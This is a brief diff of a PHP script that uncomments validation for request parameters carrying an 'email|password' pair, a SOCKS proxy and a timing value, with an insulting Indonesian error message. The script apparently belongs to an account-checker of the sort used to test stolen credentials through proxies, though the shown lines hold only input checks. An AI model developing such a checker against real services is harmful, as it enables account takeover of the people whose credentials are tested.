@@ -4,12 +4,12 @@ require_once(__DIR__ . '/vendor/autoload.php');
 
 if (!isset($_REQUEST['empas']) || !isset($_REQUEST['sock']))
 {
-  // die(json_encode([
-  //   'status'  =>  'FAIL',
-  //   'empas'   =>  'FAIL|FAIL',
-  //   'sock'    =>  'FAIL',
-  //   'sec'     =>  'FAIL'
-  // ]));
+  die(json_encode([
+    'status'  =>  'FAIL',
+    'empas'   =>  'FAIL|FAIL',
+    'sock'    =>  'FAIL',
+    'sec'     =>  'FAIL'
+  ]));
 }
 
 use \Curl\Curl;
@@ -19,7 +19,7 @@ $start      = microtime(true);
 $split      = explode('|', $_REQUEST['empas']);
 $username   = (strpos($split[0], '@') === false) ? $split[0] : explode('@', $split[0])[0];
 $password   = $split[1];
-// if (empty($_REQUEST['empas']) || empty($username) || empty($password)) { die('GAADA EMPAS TOLOL'); }
+if (empty($_REQUEST['empas']) || empty($username) || empty($password)) { die('GAADA EMPAS TOLOL'); }
 
 $curl   =  new Curl();
 
